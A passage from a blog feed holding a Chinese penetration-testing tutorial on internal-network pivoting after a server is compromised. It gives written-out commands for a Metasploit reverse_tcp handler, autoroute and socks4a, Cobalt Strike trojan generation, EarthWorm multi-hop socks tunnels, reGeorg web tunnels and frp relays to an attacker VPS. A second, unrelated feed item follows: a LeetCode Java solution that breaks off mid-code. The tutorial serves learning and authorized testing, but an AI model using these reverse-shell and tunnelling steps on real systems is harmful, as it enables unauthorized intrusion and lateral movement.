&lt;p&gt;frps.ini的配置如下，确定绑定的端口，token的值，转发的端口，即可&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712074850155-1591431657.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;启动&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;.\frps.exe -c .\frps2.ini
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712074901480-1794671232.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在kali中使用frpc客户端&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;frpc.ini的配置如下，[common]是协议连接的目标，和token凭证，[appName1]~[appName3]是将10.86.0.87的10001端口映射到自己的10001端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712074910466-1864707427.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;启动方式，利用nohup和 &amp;amp;，挂后台运行&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;nohup ./frpc -c frpc2.ini &amp;amp;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712074920870-137500053.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;回过头来看windows本机，已经有信息了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712074929545-1571713870.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以使用nc尝试下，是否映射了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712074937035-1583546964.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;访问下windows的10001端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712074943857-1946644852.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;再看kali里面收到了http请求头&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712074950725-845439208.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将shell反弹到msf上&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;先在msf中进行监听php的msf的shell&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;use exploit/multi/handler 
set payload php/meterpreter/reverse_tcp
set LPORT 10001
set LHOST 10.86.0.87
run
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075005095-1321854118.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;现在DMZ服务器能间接通过的端口映射访问到kali的端口了，在冰蝎中可以使用设置好的反弹msf的payload&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075014245-799305070.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;点击给我连，就弹回来啦&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075023220-1550261202.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用msf设置代理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;拿到msf的shell了后，就是上代理了，这里因为我之前已经扫过网段了，可以确定内网是192.168.93.0/24网段&lt;/p&gt;
&lt;p&gt;因此添加路由&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;meterpreter&amp;gt; run autoroute -s 192.168.93.0/24
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以查看&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;meterpreter&amp;gt; run autoroute -p
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075033675-248396481.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;接下来将该shell挂起到后台&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;meterpreter&amp;gt; background
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;并且使用sock4a模块进行转发&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;use auxiliary/server/socks4a #socks4a socks5都可以
set srvhost 127.0.0.1
set srvport 1084
run
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075043680-64404517.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;kali中直接firefox访问下192.168.93.80的web，页面是加载不出来的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075050445-1509358066.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;接下来使用proxychains来代理访问内网的web&lt;/p&gt;
&lt;p&gt;设置一下&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;vim /etc/proxychains.conf
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075100125-1983724403.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;proxychains curl http://192.168.93.138
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;即可访问成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075107965-2104610057.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x05-cobalt-strike代理&quot;&gt;0x05 Cobalt Strike代理&lt;/h3&gt;
&lt;p&gt;这个就很好用了，强烈推荐，因为我是在windows上起的cs的服务器，因此反向代理就是本机不需要端口映射，操作也非常简单（&lt;s&gt;就这玩意儿老断开连接，可能我电脑的问题&lt;/s&gt;）&lt;/p&gt;
&lt;p&gt;先创建个listener&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075116145-1431572862.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;生成一个exe的木马，当然有杀软的话可以使用powershell或者编程语言运行代码直接反弹&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075124140-1110351461.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;丢到服务器上运行&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075132161-774095886.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;OK弹回来了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075138965-1109157169.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;因为这里是代理使用的总结，就不深入总结cs的利用，直接使用代理模块&lt;/p&gt;
&lt;p&gt;这里cs有2个代理方式，一个是浏览器代理，一个是sock代理&lt;/p&gt;
&lt;p&gt;首先看浏览器代理&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075147623-653544121.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075154815-1772296615.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;接下来，就可以使用我本机的浏览器，挂代理访问了，挂代理方式和burp一样，这里使用的是本机的4001端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075202530-1303623331.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;设置方式很简单&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075209665-2053829452.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;访问下试试&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075218340-1258549905.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在kali虚拟机中同理，也可以使用这样的方式访问web了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075226460-658447311.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;但是proxychains是不行的，接下来可以使用cs的另一个代理socks&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075236490-457505741.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075254002-1357346415.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;接下里配置proxychains&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075304840-2069151272.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;成功代理&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075312865-1656243153.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x06-使用earthworm&quot;&gt;0x06 使用earthworm&lt;/h3&gt;
&lt;p&gt;ew是一个很厉害的软件，但是因为很厉害所以作者已经关闭下载了....&lt;/p&gt;
&lt;p&gt;他有各种系统的可执行文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075322252-2088686521.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;ew具有lcx的转发功能，还能执行socks代理&lt;/p&gt;
&lt;p&gt;正向代理和反向代理的区别很多文章都有提到，从表面上看正向代理的代理端口和ip是在被攻击的服务器上，反向代理的端口和ip是自己的本机&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;正向代理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;将对应系统的可执行文件上传上去&lt;/p&gt;
&lt;p&gt;只需要在服务器执行&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ew_for_Win.exe -s ssocksd -l 2336
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075332680-1623115201.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;配置好proxychains，代理为172.16.3.145:2336端口，能够访问内网了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075339985-1749638586.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;反向代理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在本地使用ew进行端口监听，意思是将本地从4399接收到的流量转发到2337端口上&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;.\ew_for_Win.exe -s rcsocks -l 2337 -e 4399
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075348825-549099668.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在跳板的服务器上执行,将自己的代理服务转到远程10.86.0.87服务器上的4399端口&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ew_for_Win.exe -s rssocks -d 10.86.0.87 -e 4399
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075356985-645905795.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;尝试下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075403641-1389090836.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ew具有lcx的功能&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在最上面介绍lcx的时候提到了lcx具有将远程的端口映射到本地，和将本地的端口A流量转移到端口B的功能&lt;/p&gt;
&lt;p&gt;ew同样有lcx的功能，使用方法如下，这里还是拿3389为例&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将远程端口映射到本地&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在本机起监听，监听自己的4399和2338端口，将4399端口收到的数据转出到2338端口接收&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;.\ew_for_Win.exe -s lcx_listen -l 2338 -e 4399
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在远程的服务器上执行&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ew_for_Win.exe -s lcx_slave -d 10.86.0.87 -e 4399 -f 127.0.0.1 -g 3389
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075412235-1020350426.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将本机的端口A转发到端口B&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ew_for_Win.exe -s lcx_tran -l 4002 -f 127.0.0.1 -g 3389
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075420730-1935823265.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;多级代理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ew移植lcx的功能不仅仅是为了集合功能，更重要的是可以凭借该功能达到多层代理，这里没有实际的环境，举个例子&lt;/p&gt;
&lt;p&gt;攻击机A ，边间服务器B，内网1层的服务器C，内网2层的服务器D&lt;/p&gt;
&lt;p&gt;首先拿到B，挂好代理，只能看到C，但不能看到D，这时候就要借助EW的转发功能实现多层内网渗透&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;攻击机A,使用反向代理&lt;/p&gt;
&lt;p&gt;将接到的3001端口的流量，开到自己的2001端口上，最终是挂本地2001端口，实现代理的&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;.\ew_for_Win.exe -s rcsocks -l 2001 -e 3001
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;边界服务器B，使用流量转发和流量监听&lt;/p&gt;
&lt;p&gt;流量转发，将本地4001端口流量转移到A的3001端口上&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;.\ew_for_Win.exe -s lcx_slave -d A的ip -e 3001 -f 127.0.0.1 -g 4001
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;流量监听，将接受到的5001端口的流量转到自己的4001上&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;.\ew_for_Win.exe -s lcx_listen -l 4001 -e 5001
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;内网1层的服务器C&lt;/p&gt;
&lt;p&gt;反向代理，将自己的5001的socks代理传给B的5001端口&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;.\ew_for_Win.exe -s rssocks -d B的ip -e 5001 
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;综上所述，访问到D的流量如下&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;D -&amp;gt; C -&amp;gt; B:5001 -&amp;gt; B:4001 -&amp;gt; A:3001 -&amp;gt; A:2001 
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;挂A:2001的代理，即可访问到D&lt;/p&gt;
&lt;h3 id=&quot;0x07-regeorg&quot;&gt;0x07 reGeorg&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;reGeorg&lt;/code&gt;使用起来也很方便，他和以上的几种工具想比，它不需要在目标上运行程序，只需要把对应的web的脚本上传上去能够访问即可&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075433160-2088748957.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;reGeorg&lt;/code&gt;的文件主要是以web的后台语言为代理脚本，因此要使用&lt;code&gt;reGeorg&lt;/code&gt;的先决条件是需目标具有web服务&lt;/p&gt;
&lt;p&gt;这里的例子是PHP，先上传&lt;code&gt;tunnel.php&lt;/code&gt;函数报错了，之后我上传了&lt;code&gt;tunnel.nosocket.php&lt;/code&gt;，则正常工作了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075441625-31042009.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;tunnel.nosocket.php能正常打开&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075448565-39413311.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;接下来在本地，使用python运行它的py脚本，如果不加-l参数则默认是127.0.0.1的地址开启的代理，这时kali就没法使用10.86.0.87，ip来设置代理了&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;python .\reGeorgSocksProxy.py -l 10.86.0.87 -p 5432 -u http://172.16.3.145/tunnel.nosocket.php
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075457244-326579865.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;自己的5432端口即为代理端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075503660-2035882974.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x08-frp&quot;&gt;0x08 frp&lt;/h3&gt;
&lt;p&gt;在博客搬家的时候，又另外学到一招使用frp进行内网代理的，十分稳定好用，最主要的是frp是正常软件，杀软一般不会杀&lt;br/&gt;理清思路，跳板机是frpc，我们的vps是frps，将跳板机的流量转到vps的一个端口上，代理走vps的转发端口即可完成内网代理&lt;/p&gt;
&lt;p&gt;在跳板机上的frpc.ini内容如下，将tcp的流量使用socks5，压缩一下转到远程端口的8881上&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;[common]
server_addr = mi0.xyz
server_port = 7000
token = xxxxxx

[socks_proxy]
type = tcp
remote_port = 8881
plugin = socks5
use_compression = true
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在vps服务器上的frps.ini&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;[common]
bind_addr = 0.0.0.0
bind_port = 7000
token = xxxxx
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;之后先在vps上启动frps.ini&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;nohup ./frps -c frps.ini &amp;amp;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在跳板机上启动frpc.ini&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#linux
nohup ./frpc -c frpc.ini &amp;amp;
#windows
./frpc.exe -c frpc.ini
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;0x09代理客户端&quot;&gt;0x09代理客户端&lt;/h3&gt;
&lt;p&gt;在最前面讲到有3个代理的客户端，其中&lt;code&gt;proxychains&lt;/code&gt;是linux下的，也是上面各种工具使用时候，使用的代理方式验证，&lt;code&gt;proxifier&lt;/code&gt;和&lt;code&gt;SocksCap64&lt;/code&gt;均是windows下的工具，有图形化的界面，免费的。&lt;code&gt;proxifier&lt;/code&gt;随便找个激活码即可&lt;/p&gt;
&lt;h5 id=&quot;proxychains&quot;&gt;proxychains&lt;/h5&gt;
&lt;p&gt;安装,kali自带的&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;apt-get install proxychains
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;直接修改&lt;code&gt;/etc/proxychains.conf&lt;/code&gt;文件&lt;/p&gt;
&lt;p&gt;在最下面的&lt;code&gt;[ProxyList]&lt;/code&gt;中以以下格式设置代理&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;socks4 ip port
或者
socks5 ip port
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075513205-1831848830.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;使用方法也很简单，这样msf就能本身挂代理了&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;proxychains msfconsole
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;但是&lt;code&gt;proxychains&lt;/code&gt;有些命令不支持，比如&lt;code&gt;ping&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&quot;proxifier&quot;&gt;proxifier&lt;/h5&gt;
&lt;p&gt;该工具是windows下的，配置有2个注意点即可&lt;/p&gt;
&lt;p&gt;1.配置代理的ip和端口&lt;/p&gt;
&lt;p&gt;2.配置走代理的exe程序&lt;/p&gt;
&lt;p&gt;以刚刚的reGeorg代理为例&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075522125-1410544264.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;配置好了代理的服务器，接下来配置哪些服务走该代理&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075527966-1673456296.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Direct是直连，即不走代理的意思， proxy SOCKS5 即是刚刚设置的代理，当前设置是firefox走代理，chrome.exe不走代理&lt;/p&gt;
&lt;p&gt;这个规则表和配置交换机的ACL协议一样，从上往下读协议的&lt;/p&gt;
&lt;p&gt;如果要burp抓包，则使用Any，Any，Any，即全部应用都走代理即可&lt;/p&gt;
&lt;h5 id=&quot;sockscap64&quot;&gt;SocksCap64&lt;/h5&gt;
&lt;p&gt;和&lt;code&gt;proxifier&lt;/code&gt;很相似，先设置代理&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075534940-448195661.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;接下来右键下面的应用，选择在代理隧道中运行即可，该应用也可以添加&lt;/p&gt;
&lt;p&gt;这里在代理隧道中运行chrome，即可访问内网的web服务&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712075546880-1187512310.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x09-结语&quot;&gt;0x09 结语&lt;/h3&gt;
&lt;p&gt;挂代理思路清楚了是比较简单的事情，渗透测试和CTF稍微不同的地方在于，CTF注重原理，深入到代码的写法问题，而渗透测试则注重工具的使用。lcx和ew很容易被杀软杀掉，但是在比较low或者比赛或者学习的环境中或者关掉杀软的情况下还是比较好使的@_@&lt;/p&gt;
</description>
<pubDate>Sun, 12 Jul 2020 00:05:00 +0000</pubDate>
<dc:creator>sijidou</dc:creator>
<og:description>0x00前言 在拿到一台服务器的shell的时候，如果想要更进一步渗透测试，则需要进行内网渗透 而内网渗透的第一步就是挂代理，首先需要明确一个概念，在日常生活中常用vpn挂代理去google查资料，自</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/sijidou/p/13286938.html</dc:identifier>
</item>
<item>
<title>Java实现 LeetCode第30场双周赛 （题号5177，5445，5446，5447） - 南墙1</title>
<link>http://www.cnblogs.com/a1439775520/p/13286935.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/a1439775520/p/13286935.html</guid>
<description>&lt;p&gt;给你一个数组 &lt;code&gt;nums&lt;/code&gt; ，它包含 &lt;code&gt;n&lt;/code&gt; 个正整数。你需要计算所有非空连续子数组的和，并将它们按升序排序，得到一个新的包含 &lt;code&gt;n * (n + 1) / 2&lt;/code&gt; 个数字的数组。&lt;/p&gt;
&lt;p&gt;请你返回在新数组中下标为&lt;em&gt; &lt;/em&gt;&lt;code&gt;left&lt;/code&gt; 到 &lt;code&gt;right&lt;/code&gt; （下标从 1 开始）的所有数字和（包括左右端点）。由于答案可能很大，请你将它对 10^9 + 7 取模后返回。&lt;/p&gt;

&lt;p&gt;示例 1：&lt;/p&gt;
&lt;pre&gt;
输入：nums = [1,2,3,4], n = 4, left = 1, right = 5
输出：13 
解释：所有的子数组和为 1, 3, 6, 10, 2, 5, 9, 3, 7, 4 。将它们升序排序后，我们得到新的数组 [1, 2, 3, 3, 4, 5, 6, 7, 9, 10] 。下标从 le = 1 到 ri = 5 的和为 1 + 2 + 3 + 3 + 4 = 13 。
&lt;/pre&gt;
&lt;p&gt;示例 2：&lt;/p&gt;
&lt;pre&gt;
输入：nums = [1,2,3,4], n = 4, left = 3, right = 4
输出：6
解释：给定数组与示例 1 一样，所以新数组为 [1, 2, 3, 3, 4, 5, 6, 7, 9, 10] 。下标从 le = 3 到 ri = 4 的和为 3 + 3 = 6 。
&lt;/pre&gt;
&lt;p&gt;示例 3：&lt;/p&gt;
&lt;pre&gt;
输入：nums = [1,2,3,4], n = 4, left = 1, right = 10
输出：50
&lt;/pre&gt;

&lt;p&gt;提示：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;1 &amp;lt;= nums.length &amp;lt;= 10^3&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;nums.length == n&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1 &amp;lt;= nums[i] &amp;lt;= 100&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1 &amp;lt;= left &amp;lt;= right &amp;lt;= n * (n + 1) / 2&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Solution {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; rangeSum(&lt;span&gt;int&lt;/span&gt;[] nums, &lt;span&gt;int&lt;/span&gt; n, &lt;span&gt;int&lt;/span&gt; left, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; right) {
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;         LinkedList&amp;lt;Integer&amp;gt; list = &lt;span&gt;new&lt;/span&gt; LinkedList&amp;lt;&amp;gt;&lt;span&gt;();
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;         &lt;span&gt;int&lt;/span&gt; sum = 0&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;         &lt;span&gt;//&lt;/span&gt;&lt;span&gt;暴力循环每一种情况&lt;/span&gt;
&lt;span&gt; 6&lt;/span&gt;         &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt; nums.length; i++&lt;span&gt;) {
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;             sum = 0&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;             &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; j = i; j &amp;lt; nums.length; j++&lt;span&gt;) {
